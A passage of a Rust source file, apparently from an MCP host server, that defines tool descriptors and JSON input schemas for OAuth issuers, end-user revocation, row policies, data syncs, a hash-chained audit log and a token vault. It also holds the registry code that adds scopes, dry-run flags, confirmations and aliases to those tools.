            "host.oauth.trusted_issuer_remove",
            "Remove one of this tenant's trusted identity-assertion issuers; its assertions stop \
             authenticating immediately.",
            host_schema(
                json!({"issuer": {"type": "string", "description": "The issuer to remove."}}),
                &["issuer"],
            ),
        ),
        Tool::new(
            "host.oauth.trusted_issuers",
            "List this tenant's trusted identity-assertion issuers with their jwks_url, client_id \
             and audience.",
            host_schema(json!({}), &[]),
        ),
        // PRD-mcphost-end-user-identity P1 requirement 7 (AC10).
        Tool::new(
            "host.enduser.whoami",
            "The end user (if any) this call itself carries: {subject, issuer, method, \
             verified_at} from the OAuth bearer's sub/iss or a verified end_user_assertion; \
             {\"value\": null} when the call carries no verified end-user identity.",
            host_schema(json!({}), &[]),
        ),
        // requirement 2 (AC11): rotates this tenant's HS256 end_user_assertion \
        // signing secret, returning the new value once.
        Tool::new(
            "host.enduser.assertion_secret_rotate",
            "Generate and store a new per-tenant secret for signing end_user_assertion (HS256 \
             compact JWS, claims sub/iat/exp with exp <= iat + 3600). Returns the secret once; \
             it is never shown again and never appears in host.secret_list. Assertions signed \
             with any prior secret stop verifying immediately -- no overlap window.",
            host_schema(json!({}), &[]),
        ),
        // PRD-mcphost-row-policy requirement 7. Tenant-key only.
        Tool::new(
            "host.policy.set",
            "Set (or replace) the row/docs policy for one target: a declared table (target: \
             {\"table\": name}) or a docs prefix (target: {\"doc_prefix\": prefix}). `rule` is a \
             list of {column_or_attr, op: \"eq\"|\"in\", value: {\"literal\": <json>} | \
             {\"attr\": \"<end_user_attr>\"}}. Refused as policy_widening if it would widen an \
             existing literal-valued rule on the same column without replace: true.",
            host_schema_checked(
                json!({
                    "target": {
                        "type": "object",
                        // Exactly one key, and it is one of the target kinds.
                        "propertyNames": {"enum": crate::rowpolicy::policy::PolicyTarget::KINDS},
                        "minProperties": 1,
                        "maxProperties": 1,
                        "additionalProperties": {"type": "string"},
                        "description": "{\"table\": \"<name>\"} or {\"doc_prefix\": \"<prefix>\"}.",
                    },
                    "rule": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "column_or_attr": {"type": "string"},
                                "op": {"type": "string", "enum": crate::rowpolicy::policy::RuleOp::NAMES},
                                "value": {
                                    "oneOf": [
                                        {
                                            "type": "object",
                                            "properties": {"literal": {"type": ["string", "number", "boolean", "array", "object", "null"]}},
                                            "required": ["literal"],
                                            "additionalProperties": false,
                                        },
                                        {
                                            "type": "object",
                                            "properties": {"attr": {"type": "string"}},
                                            "required": ["attr"],
                                            "additionalProperties": false,
                                        },
                                    ],
                                },
                            },
                            "required": ["column_or_attr", "op", "value"],
                        },
                        "description": "A list of {column_or_attr, op, value} rules, ANDed together.",
                    },
                    "replace": {
                        "type": "boolean",
                        "description": "Confirms a rule change that would otherwise be refused as widening.",
                    },
                }),
                &["target", "rule"],
            ),
        ),
        Tool::new(
            "host.policy.list",
            "List this tenant's row/docs policies.",
            host_schema(json!({}), &[]),
        ),
    ]
}

/// PRD-mcphost-sync-source-registry-and-create R2/R5: the `host.sync.*` surface.
#[inline(never)]
fn host_tools_part_14() -> Vec<Tool> {
    vec![
        Tool::new(
            "host.sync.create",
            "Mirror an external dataset into a host table on a schedule: register the source and \
             return {sync_id, table, next_run_unix, status, existing} at once. The table is created \
             when absent. The same (kind, ref, table) again returns the existing sync with existing: \
             true. Errors: args_invalid (lists the valid source kinds), host_not_allowed, \
             connection_missing {provider, hint}, schedule_too_frequent {min_seconds}, \
             quota_syncs_max {limit, used}.",
            host_schema(
                json!({
                    "source": crate::sync::source_schema(),
                    "table": {"type": "string", "pattern": crate::tables::IDENT_PATTERN, "description": "The host table that mirrors the source; created if it does not exist."},
                    "mode": crate::sync::mode_schema(),
                    "every": {"type": "string", "description": format!("Five-field cron schedule, UTC (default {}); never faster than every {} seconds.", crate::sync::DEFAULT_EVERY, crate::sync::MIN_INTERVAL_S)},
                    "primary_key": {"type": "string", "pattern": crate::tables::IDENT_PATTERN, "description": "Column that identifies a row across pulls."},
                }),
                &["source", "table"],
            ),
        ),
        Tool::new(
            "host.sync.list",
            "List this tenant's syncs, oldest first: {syncs: [{sync_id, kind, ref, table, mode, every, \
             status, created_unix, next_run_unix}]}.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.sync.get",
            "One sync by id: its row plus last_run, the newest receipt {run_id, started_unix, \
             duration_ms, status, rows_added, rows_updated, rows_deleted, bytes, change_detected, \
             provider_calls, error} (null before the first run), runs (the last `limit` receipts, \
             newest first), and rows_in_table / last_snapshot_rows / drift. A receipt status is \
             running, ok, error, rate_limited, auth_expired, suspicious_empty or deferred.",
            host_schema(
                json!({
                    "sync_id": {"type": "string", "minLength": 1, "description": "The sync_id host.sync.create returned."},
                    "limit": {"type": "integer", "minimum": 1, "maximum": 100, "description": "How many receipts runs carries (default 20)."},
                }),
                &["sync_id"],
            ),
        ),
        Tool::new(
            "host.sync.delete",
            "Delete a sync and its receipts. The mirrored table and its rows stay and keep \
             answering host.table.query.",
            host_schema(
                json!({"sync_id": {"type": "string", "minLength": 1, "description": "The sync_id host.sync.create returned."}}),
                &["sync_id"],
            ),
        ),
        Tool::new(
            "host.sync.run_now",
            "Make a sync due now: next_run_unix becomes the current time and the scheduler picks \
             it up on its next pass. Returns {sync_id, next_run_unix}.",
            host_schema(
                json!({"sync_id": {"type": "string", "minLength": 1, "description": "The sync_id host.sync.create returned."}}),
                &["sync_id"],
            ),
        ),
    ]
}

/// PRD-mcphost-tools-call-progress-notifications P0: the progress probe.
#[inline(never)]
fn host_tools_part_15() -> Vec<Tool> {
    vec![Tool::new(
        "host.probe.progress",
        "Report progress on a schedule, so a client can see notifications/progress frames arrive \
         before the result. Sleeps step_ms, then reports, steps times; with _meta.progressToken \
         each report is one notifications/progress frame (progress = pct, total = 100, or with \
         mode=count progress = the step number and no total). Returns {steps, elapsed_ms}. Never \
         runs longer than 25 s.",
        host_schema_checked(
            json!({
                "steps": {"type": "integer", "minimum": 1, "maximum": 5, "description": "How many reports to make, 1-5."},
                "step_ms": {"type": "integer", "minimum": 1000, "maximum": 5000, "description": "Milliseconds to sleep before each report, 1000-5000."},
                "mode": {"type": "string", "enum": crate::progress::ProbeMode::NAMES, "description": "pct (default): progress is the percentage done with total 100; count: progress is the step number, no total."},
            }),
            &["steps", "step_ms"],
        ),
    )]
}

#[inline(never)]
fn host_tools_part_13() -> Vec<Tool> {
    vec![
        Tool::new(
            "host.policy.attrs_set",
            "Set (merge) attributes on an end-user subject -- the values a policy's Attr(name) \
             rule compiles against for that subject.",
            host_schema_checked(
                json!({
                    "subject": {"type": "string", "description": "The end-user subject to set attributes on."},
                    "attrs": {"type": "object", "description": "An object of attribute name -> value to merge in."},
                }),
                &["subject", "attrs"],
            ),
        ),
        Tool::new(
            "host.audit.chain",
            "Newest-first page of the hash-chained audit log, optionally scoped to one subject. \
             Returns {records, returned_count, withheld_count} where withheld_count is how many \
             more matching records exist beyond this page. Tenant-key only.",
            host_schema(
                json!({
                    "subject": {"type": "string", "description": "Only records for this end-user subject."},
                    "limit": {"type": "integer", "description": "Max records to return, 1-500; default 50."},
                    "before_id": {"type": "integer", "description": "Only records with id less than this."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.audit.export",
            "Export every audit row of this tenant (audit_chain, tenant_audit, oauth_audit) as one \
             hash-chained JSONL: a header line, one line per row in (ts, table, id) order each \
             carrying prev and hash, and a trailer with root_hash, rows and an ES256 signature \
             verifiable with /.well-known/jwks.json and scripts/audit-verify.py. More than 50000 rows \
             refuses export_too_large {rows}. format csv renders the same lines. A read tool: a read-only \
             scope may call it.",
            host_schema(
                json!({
                    "since": {"type": ["integer", "string"], "description": "Start of the window (inclusive): unix seconds, YYYY-MM-DD, RFC 3339 or -24h."},
                    "until": {"type": ["integer", "string"], "description": "End of the window (exclusive), same forms as since."},
                    "limit": {"type": "integer", "minimum": 1, "maximum": crate::audit_export::EXPORT_ROWS_MAX, "description": "Refuse export_too_large past this many rows, 1-50000; default 50000."},
                    "format": {"type": "string", "enum": crate::audit_export::EXPORT_FORMATS, "description": "Default jsonl."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.audit.verify",
            "Recompute the hash-chained audit log over [from_id, to_id] and report whether it's \
             intact, naming the first broken id if not. With root_hash (from host.audit.export) it \
             recomputes that export's window instead and answers {verified, rows, through_unix}; an \
             unknown root is not_found. With no arguments it verifies the whole chain.",
            host_schema(
                json!({
                    "from_id": {"type": "integer", "description": "First audit record id to verify, inclusive."},
                    "to_id": {"type": "integer", "description": "Last audit record id to verify, inclusive."},
                    "root_hash": {"type": "string", "description": "The root_hash of an earlier host.audit.export."},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-end-user-audit-and-revoke requirement 2 (AC1/AC10).
        Tool::new(
            "host.enduser.list",
            "List this tenant's end users with last-seen and call counts, newest last-seen \
             first. Optional since (unix seconds, filters last_seen), revoked (bool), limit \
             (default 50, max 1000), and cursor (from a previous page's cursor field).",
            host_schema(
                json!({
                    "since": {"type": "integer", "description": "Only end users last seen at or after this unix timestamp."},
                    "revoked": {"type": "boolean", "description": "true: only revoked end users; false: only active ones; omit for both."},
                    "limit": {"type": "integer", "description": "Max rows per page (default 50, max 1000)."},
                    "cursor": {"type": "string", "description": "Opaque; resume after a previous response's cursor."},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-end-user-audit-and-revoke requirement 2 (AC2).
        Tool::new(
            "host.enduser.get",
            "One end user's roster row (subject, issuer, first_seen, last_seen, calls_total, \
             revoked_at, revoked_by, purged_at) plus its live state_rows, vault_connections, \
             and runs_30d counts.",
            host_schema(
                json!({"subject": {"type": "string", "description": "The end user's subject."}}),
                &["subject"],
            ),
        ),
        // PRD-mcphost-end-user-audit-and-revoke requirement 3 (AC3/AC7).
        Tool::new(
            "host.enduser.audit",
            "One end user's calls (tool, outcome, run_id, impersonated) merged with its \
             revoke/unrevoke/purge control-plane events, newest first, paged by cursor.",
            host_schema(
                json!({
                    "subject": {"type": "string", "description": "The end user's subject."},
                    "since": {"type": "integer", "description": "Only entries at or after this unix timestamp."},
                    "limit": {"type": "integer", "description": "Max entries per page (default 50, max 1000)."},
                    "cursor": {"type": "string", "description": "Opaque; resume after a previous response's cursor."},
                }),
                &["subject"],
            ),
        ),
        // PRD-mcphost-end-user-audit-and-revoke requirement 4 (AC4).
        Tool::new(
            "host.enduser.revoke",
            "Revoke an end user: its next identified call is refused with end_user_revoked, \
             no tool runs, and its vault-token connections are disconnected.",
            host_schema(
                json!({
                    "subject": {"type": "string", "description": "The end user's subject."},
                    "reason": {"type": "string"},
                }),
                &["subject"],
            ),
        ),
        // PRD-mcphost-end-user-audit-and-revoke requirement 4 (AC7).
        Tool::new(
            "host.enduser.unrevoke",
            "Reverse a prior host.enduser.revoke; the end user's calls succeed again.",
            host_schema(
                json!({"subject": {"type": "string", "description": "The end user's subject."}}),
                &["subject"],
            ),
        ),
        // PRD-mcphost-end-user-audit-and-revoke requirement 5 (AC5/AC6).
        Tool::new(
            "host.enduser.purge",
            "Delete a revoked end user's scoped state and vault-token rows, de-identify its \
             calls rows (kept, never deleted), and set purged_at. Requires the end user to be \
             revoked first (revoke_required otherwise). Returns {state_rows, vault_tokens} \
             counts.",
            host_schema(
                json!({"subject": {"type": "string", "description": "The end user's subject."}}),
                &["subject"],
            ),
        ),
        // PRD-mcphost-end-user-audit-and-revoke P1 requirement 6 (AC8).
        Tool::new(
            "host.enduser.export",
            "Export one end user's state rows and call history as a bundle at /exports/<run_id>, \
             the same envelope host.export returns (download_url, size_bytes, expires_unix).",
            host_schema(
                json!({"subject": {"type": "string", "description": "The end user's subject."}}),
                &["subject"],
            ),
        ),
        // PRD-mcphost-connection-provider-registry R3/R4: the `provider` enum is
        // `providers.toml`'s own name set (as `kind` above is the registry's),
        // never a literal list.
        Tool::new(
            "host.connect.providers",
            "List the upstream OAuth providers this host can connect (from providers.toml): \
             name, exact scope names, refresh semantics, docs_url, and available true|false \
             with a reason (client_id_not_configured | client_secret_not_configured) when the \
             host has no credentials for it yet. Never returns a client id or secret.",
            host_schema(
                json!({
                    "provider": {
                        "type": "string",
                        "enum": crate::connect::public_provider_enum(),
                        "description": "Only this provider's row; omit to list every provider.",
                    },
                }),
                &[],
            ),
        ),
        // PRD-mcphost-connect-start-and-callback R1/R4: tenant-level connections.
        Tool::new(
            "host.connect.start",
            "Mint a one-time link (valid 15 min) a human opens to connect an upstream provider \
             (host.connect.providers lists them) to this tenant with the host's own OAuth app; \
             no end user and no OAuth app of your own needed. Give the url to your user, then \
             poll host.connect.list until the provider shows connected: true. Never returns a \
             token. Errors: provider_unavailable {provider, reason}, scope_unknown {unknown}.",
            host_schema(
                json!({
                    // No `enum`: the handler resolves the name through `Provider::parse` (the
                    // same registry the enum would copy), because the schema is the committed
                    // prod contract while a `test-support` build also accepts `testprov`.
                    "provider": {
                        "type": "string",
                        "description": format!("One of {} (host.connect.providers lists them).",
                            crate::connect::public_provider_names_csv()),
                    },
                    "scopes": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Exact scope names from host.connect.providers; omit for the provider's default set.",
                    },
                }),
                &["provider"],
            ),
        ),
        Tool::new(
            "host.connect.revoke",
            "Disconnect an upstream provider from this tenant: marks the stored connection \
             revoked (revoked_reason \"tenant_revoke\") and asks the provider to revoke the \
             token when it supports that (provider_revoked true|false). Safe to repeat. \
             host.connect.list then carries a reconnect_url.",
            host_schema(
                json!({
                    "provider": {
                        "type": "string",
                        "description": format!("One of {} (host.connect.providers lists them).",
                            crate::connect::public_provider_names_csv()),
                    },
                }),
                &["provider"],
            ),
        ),
        Tool::new(
            "host.connect.list",
            "List this tenant's upstream connections, one row per provider: connected, scopes, \
             expires_at, connected_at, last_refreshed_at, revoked_at, revoked_reason, and a \
             reconnect_url when revoked. Never returns a token or a client id.",
            host_schema(json!({}), &[]),
        ),
        // PRD-mcphost-upstream-token-vault requirement 2 (AC9, AC11): never
        // returns client_secret; re-setting an existing name is free
        // against vault_providers_max (see vault::provider_set).
        Tool::new(
            "host.vault.provider_set",
            "Register or update a tenant's upstream OAuth provider (e.g. \"slack\") so end \
             users can connect it; client_secret is stored encrypted and never returned by \
             host.vault.providers. Per-plan vault_providers_max caps distinct provider names.",
            host_schema_extra(
                json!({
                    "name": {
                        "type": "string",
                        "description": "Provider name to register or update, e.g. \"slack\".",
                    },
                    "preset": {
                        "type": "string",
                        "description": format!("One of {} (host.connect.providers lists them) -- \
                            prefills auth_url/token_url. An explicit auth_url/token_url below \
                            always overrides the matching preset value, field by field.",
                            crate::connect::public_provider_names_csv()),
                    },
                    "auth_url": {
                        "type": "string",
                        "description": "OAuth authorization URL. Required unless preset \
                            supplies it.",
                    },
                    "token_url": {
                        "type": "string",
                        "description": "OAuth token-exchange URL. Required unless preset \
                            supplies it.",
                    },
                    "client_id": {
                        "type": "string",
                        "description": "The upstream OAuth application's client_id.",
                    },
                    "client_secret": {
                        "type": "string",
                        "description": "The upstream OAuth application's client_secret -- stored \
                            encrypted and never returned by host.vault.providers.",
                    },
                    "scopes": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "OAuth scopes to request, e.g. [\"channels:read\"] -- \
                            joined space-delimited when sent to the provider.",
                    },
                }),
                &["name", "client_id", "client_secret", "scopes"],
                // auth_url and token_url, each from a preset when not given.
                json!({"anyOf": [{"required": ["auth_url", "token_url"]}, {"required": ["preset"]}]}),
            ),
        ),
        // PRD-mcphost-upstream-token-vault requirement 2 (AC9): client_secret
        // never appears in the output, only encrypted in the table.
        Tool::new(
            "host.vault.providers",
            "List this tenant's registered upstream OAuth providers (auth_url, token_url, \
             client_id, scopes) -- client_secret never appears here.",
            host_schema(json!({}), &[]),
        ),
        // PRD-mcphost-upstream-token-vault requirement 3 (AC1, AC7): the
        // one-time handoff link an end user's browser completes.
        Tool::new(
            "host.vault.connect_link",
            "Mint a one-time browser link (valid 15 min) for an end user to authorize a \
             registered upstream OAuth provider; completing it stores their access and refresh \
             tokens, encrypted, in the host.",
            host_schema(
                json!({
                    "provider": {
                        "type": "string",
                        "description": "The registered provider name to connect, e.g. \"slack\".",
                    },
                    "end_user": {
                        "type": "string",
                        "description": "Must be \"self\": the caller's own verified end-user \
                            identity. Required -- there is no tenant-wide upstream connection.",
                    },
                }),
                &["provider", "end_user"],
            ),
        ),
        // PRD-mcphost-upstream-token-vault requirement 5 (AC1-AC3, AC6): the
        // union of registered providers and this subject's own token rows,
        // so a just-removed provider with a residual token still surfaces.
        Tool::new(
            "host.vault.status",
            "Show which upstream providers an end user has connected, with connected, \
             expires_at, and scopes per provider -- never the token itself.",
            host_schema(
                json!({
                    "end_user": {
                        "type": "string",
                        "description": "\"self\" for the caller's own verified end-user identity, \
                            or an explicit subject only when the call carries no end-user \
                            identity of its own. Required.",
                    },
                }),
                &["end_user"],
            ),
        ),
        // PRD-mcphost-upstream-token-vault requirement 5 (AC8): revokes
        // locally; the next call needing this provider's token returns
        // upstream_not_connected with a fresh connect_link.
        Tool::new(
            "host.vault.disconnect",
            "Revoke an end user's stored upstream token for a provider. The next call needing \
             it returns upstream_not_connected with a fresh host.vault.connect_link URL.",
            host_schema(
                json!({
                    "provider": {
                        "type": "string",
                        "description": "The provider name to disconnect, e.g. \"slack\".",
                    },
                    "end_user": {
                        "type": "string",
                        "description": "Must be \"self\": the caller's own verified end-user \
                            identity. Required -- there is no tenant-wide upstream connection.",
                    },
                }),
                &["provider", "end_user"],
            ),
        ),
        // PRD-mcphost-upstream-token-vault requirement 2: the reverse of
        // provider_set -- deletes the provider and revokes every end user's
        // stored token for it in one transaction.
        Tool::new(
            "host.vault.provider_remove",
            "Delete a registered upstream OAuth provider and revoke every end user's stored \
             token for it; a disconnected end user's host.vault.status then shows \
             connected: false.",
            host_schema(
                json!({"name": {"type": "string", "description": "The provider name to remove."}}),
                &["name"],
            ),
        ),
    ]
}

    let mut tools: Vec<Tool> = Vec::new();
    tools.extend(host_tools_part_01(kinds));
    tools.extend(host_tools_part_02());
    tools.extend(host_tools_part_03());
    tools.extend(host_tools_part_04());
    tools.extend(host_tools_part_05());
    tools.extend(host_tools_part_06());
    tools.extend(host_tools_part_07());
    tools.extend(host_tools_part_08());
    tools.extend(host_tools_part_09());
    tools.extend(host_tools_part_10());
    tools.extend(host_tools_part_11());
    tools.extend(host_tools_part_12());
    tools.extend(host_tools_part_13());
    tools.extend(host_tools_part_14());
    tools.extend(host_tools_part_15());
    tools.extend(crate::verify::tools());
    if authenticated {
        tools.push(Tool::new(
            "host.spec.test",
            SPEC_TEST_DESC,
            host_schema(
                json!({
                    "kind": {
                        "type": "string",
                        "description": "Which registered kind the spec is for, e.g. echo, http, python.",
                    },
                    "spec": {
                        "type": "object",
                        "description": "The kind-specific spec object to test, not yet published; \
                            see host.quickstart(kind) for an example.",
                    },
                    "invocations": {
                        "type": "array",
                        "items": {"type": "object"},
                        "maxItems": MAX_TEST_INVOCATIONS,
                        "description": "Up to 5 example call-argument objects to run through the \
                            spec, e.g. [{\"msg\": \"hi\"}]. Omit to run one example generated from \
                            the spec's args_schema; the response then carries example_args.",
                    },
                }),
                &["kind", "spec"],
            ),
        ));
    }
    // PRD-mcphost-paged-trait-on-every-list-verb requirement 6: a paged
    // verb's `limit`/`cursor` properties come from `paged::Paged`, spliced
    // over whatever the literal above typed, so the description exists once.
    for tool in tools.iter_mut() {
        let name = tool.name.to_string();
        if (crate::paged::paged_spec(&name).is_some() || crate::paged::fields_for(&name).is_some())
            && let Some(props) = Arc::make_mut(&mut tool.input_schema)
                .get_mut("properties")
                .and_then(Value::as_object_mut)
        {
            crate::paged::splice_input_schema(&name, props);
        }
    }
    // PRD-mcphost-call-cost-estimate requirement 3: `host.estimate` is
    // `host.tool_call` with `dry_run` forced, listed for a keyed tenant only
    // and marked `_meta.alias_of: host.tool_call` like every other alias.
    // Pushed before the alias pass so its flattened form (`host_estimate`)
    // is registered like any other name.
    if authenticated {
        tools.push(estimate_tool());
    }
    // PRD-mcphost-scope-registry-generated R2: every listed verb declares
    // the one registry scope it needs as `_meta.scope`, generated from
    // `scopes::verb_scope` (before the alias clones are made, so they carry
    // it too).
    for tool in tools.iter_mut() {
        let scope = crate::scopes::verb_scope(&tool.name);
        let meta = tool.meta.get_or_insert_with(rmcp::model::MetaObject::new);
        meta.0.insert("scope".to_string(), json!(scope.as_str()));
    }
    // PRD-mcphost-dry-run-on-write-verbs R4: `dry_run` in every `Supported`
    // write verb's schema, generated from the registry (before the alias
    // clones are made, so they carry it too).
    for tool in tools.iter_mut() {
        let name = tool.name.to_string();
        if crate::write_verbs::lookup(&name).is_some()
            && let Some(props) = Arc::make_mut(&mut tool.input_schema)
                .get_mut("properties")
                .and_then(Value::as_object_mut)
        {
            crate::write_verbs::splice_dry_run_property(&name, props);
        }
    }
    // PRD-mcphost-contract-output-schemas R1/R3: `outputSchema` comes from
    // the one registry, before `apply_tool_aliases` clones each canonical
    // under its alias and flattened names (they carry the canonical's).
    for tool in tools.iter_mut() {
        tool.output_schema = crate::output_schemas::output_schema_for(tool.name.as_ref());
    }
    // PRD-mcphost-destructive-verb-confirmation-token R4: every confirm-gated
    // verb is marked `destructiveHint` and its description ends with the
    // confirm rule -- both read off the registry (`confirm::gated`), so a
    // verb added to `WRITE_VERBS` is annotated with no further code.
    for tool in tools.iter_mut() {
        if crate::confirm::gated_name(&tool.name) {
            // The token argument the description asks for, declared so the
            // validator knows it (a measured re-dispatch carries `confirm:
            // true`; undeclared, it was refused and the gate measured nothing).
            if let Some(props) = Arc::make_mut(&mut tool.input_schema)
                .get_mut("properties")
                .and_then(Value::as_object_mut)
            {
                props.entry("confirm".to_string()).or_insert_with(crate::confirm::confirm_property);
            }
            let mut annotations = rmcp::model::ToolAnnotations::default();
            annotations.destructive_hint = Some(true);
            annotations.idempotent_hint = Some(false);
            tool.annotations = Some(annotations);
            let existing = tool.description.clone().unwrap_or_default();
            tool.description = Some(Cow::Owned(format!("{existing} {}", crate::confirm::CONFIRM_SENTENCE)));
        }
    }
    // PRD-mcphost-host-args-validated-by-default R1: the one writer of
    // `VALIDATED_KEY`, before the alias clones are made so they carry it too.
    crate::host_args::mark_validated(&mut tools);
    apply_tool_aliases(&mut tools);
    tools
}

/// `host.estimate`'s descriptor: the dry-run half of `host.tool.call`'s
/// arguments (no `async`, no `dry_run` -- it is always one).
fn estimate_tool() -> Tool {
    let mut tool = Tool::new(
        "host.estimate",
        "Ask whether a call to one of your tools fits your plan and what it uses, without \
         making it: the same checks as host.tool_call, no call row, no slot held.",
        host_schema(
            json!({
                "name": {"type": "string", "description": "Local name of the tool to estimate."},
                "args": {
                    "type": "object",
                    "description": "Arguments the call would carry, checked against the tool's own args_schema.",
                },
                "version": {
                    "type": "integer",
                    "description": "Estimate against this version instead of whichever is current.",
                },
                "budget": {
                    "type": "object",
                    "description": "The budget the call would carry: any subset of max_child_calls, \
                        max_est_tokens, max_tool_latency_ms, max_wall_ms. A value above the plan's \
                        ceiling comes back as the refusal.",
                    "properties": crate::plans::Plan::budget_schema_properties(
                        &crate::plans::PlanCatalog::default_catalog(),
                    ),
                },
            }),
            &["name"],
        ),
    );
    set_alias_of(&mut tool, "host.tool_call");
    tool
}

/// PRD-mcphost-tool-naming-convention-and-aliases requirement 2/3: for
/// every [`crate::tool_aliases::TOOL_ALIASES`] entry whose canonical tool
/// is in `tools`, pushes a clone of it under the old (alias) name, with
/// `x-deprecated: {replaced_by, sunset}` added to the clone's own input
/// schema (requirement 2's wire shape -- deliberately distinct field
/// names from `annotate_deprecated_tools`'s `{since, sunset, replacement}`,
/// a different, per-field deprecation system this one doesn't reuse). The
/// alias clone's `description` and `inputSchema` are otherwise byte-
/// identical to the canonical's (AC3's own "equal to the canonical's"),
/// since it's a clone, not a second hand-written descriptor -- no
/// `[DEPRECATED ...]` text is prepended here the way
/// `annotate_deprecated_tools` prepends one to its own descriptions, since
/// several canonical descriptions (the dry-run tools') are already budgeted
/// to the byte (`tests/surface_ac02_dry_run_descriptions.rs`'s 160-char
/// cap) with no room for one; `x-deprecated` is the machine-readable
/// signal, same as every other field this registry carries. A no-op for
/// any [`crate::tool_aliases::TOOL_ALIASES`] entry whose canonical isn't
/// in `tools` (e.g. `host.spec_test`'s alias is only added when
/// `authenticated`, matching its canonical's own gating above).
fn apply_tool_aliases(tools: &mut Vec<Tool>) {
    for a in crate::tool_aliases::TOOL_ALIASES {
        let Some(canonical) = tools.iter().find(|t| t.name == a.canonical) else {
            continue;
        };
        let mut clone = canonical.clone();
        clone.name = Cow::Borrowed(a.alias);
        set_alias_of(&mut clone, a.canonical);
        Arc::make_mut(&mut clone.input_schema).insert(
            "x-deprecated".to_string(),
            json!({
                "replaced_by": a.canonical,
                "sunset": crate::tool_aliases::SUNSET_DATE,
            }),
        );
        tools.push(clone);
    }
    // PRD-mcphost-tools-list-alias-truth requirement 2: the flattened
    // `a_b_c` form of every canonical, cloned from it (no `x-deprecated`:
    // it is the name MCP clients derive, not a retired one). A collision is
    // reported by `validate_tool_registry` at startup; here it just skips.
    let canonicals: Vec<String> = tools
        .iter()
        .map(|t| t.name.to_string())
        .filter(|n| crate::tool_aliases::resolve(n).is_none())
        .collect();
    let refs: Vec<&str> = canonicals.iter().map(String::as_str).collect();
    let Ok(registry) = crate::tool_aliases::build_registry(&refs) else {
        return;
    };
    for entry in registry {
        let Some(flat) = entry.flattened else { continue };
        let Some(canonical) = tools.iter().find(|t| t.name == entry.canonical.as_str()) else {
            continue;
        };
        let mut clone = canonical.clone();
        clone.name = Cow::Owned(flat);
        set_alias_of(&mut clone, &entry.canonical);
        tools.push(clone);
    }
}

/// The `outputSchema` of a tenant tool whose spec declared `outputs`: an
/// object whose `payload` carries each declared field (any JSON value --
/// the spec author owns the field's type). `None` when nothing was declared.
fn declared_outputs_schema(declared: &[crate::kinds::OutputDecl]) -> Option<Arc<Map<String, Value>>> {
    if declared.is_empty() {
        return None;
    }
    let fields: Map<String, Value> = declared.iter().map(|d| (d.name.clone(), json!({}))).collect();
    let schema = json!({
        "type": "object",
        "properties": {"payload": {"type": "object", "properties": fields}},
    });
    Some(Arc::new(value_to_json_object(schema)))
}

/// PRD-mcphost-tools-list-alias-truth requirement 6: an alias (dotted or
/// flattened) entry carries `_meta.alias_of: <canonical>` so clients can
/// collapse the extra names; canonical entries never carry it.
fn set_alias_of(tool: &mut Tool, canonical: &str) {
    let meta = tool.meta.get_or_insert_with(rmcp::model::MetaObject::new);
    meta.0.insert("alias_of".to_string(), json!(canonical));
}

/// PRD-mcphost-tools-list-alias-truth requirement 3: the one
/// `unknown_tool` error for a `host.*`/`billing.*` name nothing dispatches,
/// with `nearest` drawn from exactly what `tools/list` advertises.
/// The names `McpHostHandler::arm_unadvertised` (handler/arms.rs) serves -- read
/// by `precheck::precheck_tenant_call`'s name-exists check.
/// `admin_events.action` of a rolled-back implicit signup (R2).
pub(crate) const ROLLED_BACK_ACTION: &str = "implicit_signup_rolled_back";

pub(crate) const UNADVERTISED_ARMS: &[&str] = &["host.tool_from_description", "billing.status", "billing.checkout"];

pub(crate) fn unknown_host_tool(kinds: &KindRegistry, requested: &str) -> AppError {
    let advertised: Vec<String> = host_tools(kinds, true).into_iter().map(|t| t.name.to_string()).collect();
    let canonical = canonical_control_plane_names(kinds);
    AppError::host_tool_not_found(requested, &canonical, &advertised)
}

/// Canonical control-plane names (dotted `host.*`/`billing.*` plus bare
/// `signup`-style names); aliases and flattened clones excluded.
pub fn canonical_control_plane_names(kinds: &KindRegistry) -> Vec<String> {
    host_tools(kinds, true)
        .into_iter()
        .map(|t| t.name.to_string())
        .filter(|n| {
            crate::tool_aliases::resolve(n).is_none()
                && (n.contains('.') || !(n.starts_with("host_") || n.starts_with("billing_")))
        })
        .collect()
}

/// Startup check (PRD-mcphost-tools-list-alias-truth AC4): refuses a
/// registry whose flattened forms collide, naming both tools.
pub fn validate_tool_registry(kinds: &KindRegistry) -> Result<(), crate::tool_aliases::RegistryCollision> {
    let names = canonical_control_plane_names(kinds);
    let refs: Vec<&str> = names.iter().map(String::as_str).collect();
    crate::tool_aliases::build_registry(&refs).map(|_| ())
}

/// `host_tool_run` -> `host.tool.run`: the canonical a flattened wire name
/// stands for, `None` for any other name.
fn flattened_to_canonical(kinds: &KindRegistry, name: &str) -> Option<String> {
    static MAP: std::sync::OnceLock<HashMap<String, String>> = std::sync::OnceLock::new();
    if !(name.starts_with("host_") || name.starts_with("billing_")) {
        return None;
    }
    MAP.get_or_init(|| {
        canonical_control_plane_names(kinds)
            .into_iter()
            .filter_map(|c| crate::tool_aliases::flattened_form(&c).map(|f| (f, c)))
            .collect()
    })
    .get(name)
    .cloned()
}

fn admin_tools_raw() -> Vec<Tool> {
    vec![
        Tool::new(
            "admin.tenants",
            "List every tenant, optionally filtered to display names starting with `prefix` \
             and/or by `synthetic` (`true`: only labeled tenants, `false`: only unlabeled, \
             `all`: no filter -- the default) and/or by `disabled_reason` (e.g. `idle_expired`). \
             Every row carries a `synthetic` field, null for unlabeled, and `expires_at_unix`, \
             when the idle sweep ends the tenant (null unless it is a synthetic implicit \
             unclaimed tenant).",
            schema(
                json!({
                    "prefix": {"type": "string"},
                    "synthetic": {"type": "string", "enum": crate::admin::SYNTHETIC_FILTERS},
                    "disabled_reason": {"type": "string", "description": "Only tenants disabled for this reason (self_offboard, admin_disable, idle_expired)."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "admin.tenant_disable",
            "Disable a tenant; its key stops authenticating.",
            schema(json!({"tenant": {"type": "string"}}), &["tenant"]),
        ),
        // PRD-mcphost-call-audit-export R5.
        Tool::new(
            "admin.calls_export",
            "Export a tenant's call log for a window as the same signed CSV bundle the tenant's \
